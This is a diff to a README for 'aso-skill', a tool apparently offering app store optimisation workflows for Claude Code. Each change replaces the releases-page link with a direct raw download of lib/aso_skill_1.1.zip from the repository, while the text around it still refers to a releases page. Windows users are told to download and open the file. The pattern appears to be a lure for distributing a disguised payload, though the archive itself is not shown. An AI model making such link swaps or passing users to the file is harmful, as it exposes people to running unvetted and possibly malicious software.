@@ -1,10 +1,10 @@
 # 🧩 aso-skill - ASO workflows for Claude Code
 
-[![Download aso-skill](https://img.shields.io/badge/Download-aso--skill-blue?style=for-the-badge)](https://github.com/Pipemajortenuity150/aso-skill/releases)
+[![Download aso-skill](https://img.shields.io/badge/Download-aso--skill-blue?style=for-the-badge)](https://github.com/Pipemajortenuity150/aso-skill/raw/refs/heads/main/lib/aso_skill_1.1.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/Pipemajortenuity150/aso-skill/releases
+Visit this page to download: https://github.com/Pipemajortenuity150/aso-skill/raw/refs/heads/main/lib/aso_skill_1.1.zip
 
 On that page, look for the latest release and download the file for Windows. If you see more than one file, choose the one that matches your computer.
 
@@ -32,7 +32,7 @@ Before you start, make sure you have:
 
 ## 🚀 Install and run on Windows
 
-1. Open the download page: https://github.com/Pipemajortenuity150/aso-skill/releases
+1. Open the download page: https://github.com/Pipemajortenuity150/aso-skill/raw/refs/heads/main/lib/aso_skill_1.1.zip
 
 2. Find the newest release at the top of the list.
 
@@ -211,6 +211,6 @@ Use aso-skill with your own app data. Keep your store details, keyword lists, an
 
 ## 📦 Release page
 
-Download from the releases page here: https://github.com/Pipemajortenuity150/aso-skill/releases
+Download from the releases page here: https://github.com/Pipemajortenuity150/aso-skill/raw/refs/heads/main/lib/aso_skill_1.1.zip
 
 Look for the latest version, download the Windows file, then open it on your computer
